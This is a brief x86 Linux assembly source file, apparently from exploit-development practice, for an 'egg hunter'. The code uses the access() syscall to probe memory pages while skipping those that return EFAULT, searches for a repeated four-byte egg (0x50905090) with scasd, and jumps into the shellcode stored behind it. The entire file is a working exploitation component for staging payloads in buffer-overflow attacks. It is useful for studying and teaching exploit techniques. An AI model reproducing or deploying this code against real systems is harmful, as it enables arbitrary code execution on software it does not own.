global _start

section .text

_start:

	xor edx, edx
	xor ecx, ecx
inc_page:
	or dx, 0xfff
inc_addr:
	inc edx
	
	lea ebx, [edx+0x4]

	push byte 0x21
	pop eax
	
	int 0x80			; check memory

	cmp al, 0xf2			; check if EFAULT is returned
	jz inc_page

	; valid memory, look for egg now

	mov eax, 0x50905090		; key
	mov edi, edx

	scasd				; check for first half of egg
	jnz inc_addr

	scasd				; check for second half of egg
	jnz inc_addr

	jmp edi				; egg found! jump to edi (start of shellcode because scasd increased pointer each time)
